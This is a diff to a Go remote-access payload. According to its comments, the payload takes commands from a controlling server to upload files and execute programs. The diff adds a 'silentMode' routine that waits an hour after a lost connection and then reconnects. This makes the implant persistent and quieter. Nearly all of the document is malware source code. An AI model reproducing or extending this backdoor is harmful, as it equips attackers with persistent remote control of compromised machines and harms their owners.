@@ -9,6 +9,8 @@ import (
 	"os/exec"
 	"strconv"
 	"strings"
+	"sync"
+	"time"
 )
 
 // BufferSize is the amount of bytes being recevied from the server
@@ -32,13 +34,19 @@ func (p *Payload) Run() {
 	defer conn.Close()
 
 	p.Conn = conn
+	wg := new(sync.WaitGroup)
 
 	for {
 		// commandByteBuffer is the firt 2 bytes being sent by the server
 		// we grab this to check if the server is sending over any special commands
 		// to upload a file or execute a program
 		commandByteBuffer := make([]byte, 2)
-		p.Conn.Read(commandByteBuffer)
+		_, err := p.Conn.Read(commandByteBuffer)
+		if err != nil {
+			wg.Add(1)
+			go p.silentMode(wg)
+			break
+		}
 
 		switch {
 		case string(commandByteBuffer) == "u:":
@@ -49,6 +57,15 @@ func (p *Payload) Run() {
 			p.executeCommand(commandByteBuffer)
 		}
 	}
+	wg.Wait()
+}
+
+func (p *Payload) silentMode(wg *sync.WaitGroup) {
+	defer wg.Done()
+	time.Sleep(1 * time.Hour)
+
+	// reconnect
+	p.Run()
 }
 
 func (p *Payload) receiveFile() {
